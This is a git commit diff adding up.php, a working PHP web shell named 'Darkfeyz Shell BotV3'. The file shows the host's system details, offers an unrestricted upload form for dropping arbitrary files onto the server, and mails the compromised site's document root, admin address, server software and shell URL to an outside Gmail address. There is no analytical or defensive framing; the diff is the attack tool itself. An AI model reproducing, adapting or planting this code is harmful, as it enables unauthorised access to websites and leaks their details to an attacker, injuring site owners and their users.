be436c7c21ead6183b083d6621c7855692f8b26c
Darkfeyz r00t <hiphoptra@gmail.com>
2020-02-09 05:45:24 +0300

    Create up.php

---
+++ up.php
@@ -0,0 +1,18 @@
+<?php
+$str = 'RGFya2ZleXpTaGVsbFYzQm90MFhfZ29wXzIwMjA=';echo base64_decode($str);
+
+?>
+<title>Vuln!! patch it Now! DarkfeyzV3</title>
+<?php echo 'DarkfeyzV3 uname'.'<br>'.'uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done'); 	 	 </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } 
+?>
+
+<?php
+$kime="hiphoptra@gmail.com";
+$baslik="Darkfeyz Shell BotV3";
+$spyhackerz="Dosya Yolu : ".$_SERVER['DOCUMENT_ROOT']."\r\n";
+$spyhackerz.="Server Admin : ".$_SERVER['SERVER_ADMIN']."\r\n";
+$spyhackerz.="Server isletim sistemi : ".$_SERVER['SERVER_SOFTWARE']."\r\n";
+$spyhackerz.="Shell Link : http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\r\n";
+$spyhackerz.="Avlanan Site : " .$_SERVER['HTTP_HOST']."\r\n";
+mail($kime, $baslik, $spyhackerz);
+?>
